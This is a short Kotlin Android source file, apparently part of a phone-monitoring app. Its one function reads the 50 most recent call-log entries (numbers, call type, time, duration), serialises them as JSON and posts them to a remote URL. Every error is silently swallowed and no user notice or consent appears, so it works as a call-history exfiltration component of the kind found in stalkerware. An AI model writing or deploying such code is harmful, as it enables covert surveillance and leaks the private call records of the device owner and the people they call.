package com.example.historicocelular

import android.content.Context
import android.provider.CallLog
import org.json.JSONArray
import org.json.JSONObject

object CallLogReader {
    fun enviar(ctx: Context, url: String) {
        try {
            val projecao = arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            )
            val cursor = ctx.contentResolver.query(
                CallLog.Calls.CONTENT_URI, projecao, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 50"
            )
            val lista = JSONArray()
            cursor?.use {
                while (it.moveToNext()) {
                    val item = JSONObject().apply {
                        put("numero", it.getString(0) ?: "")
                        put("tipo", it.getInt(1).toString())
                        put("ts", it.getLong(2))
                        put("duracao", it.getInt(3))
                    }
                    lista.put(item)
                }
            }
            val json = JSONObject().apply { put("chamadas", lista) }
            DataSender.postar(url, "chamadas", json)
        } catch (e: Exception) {}
    }
}
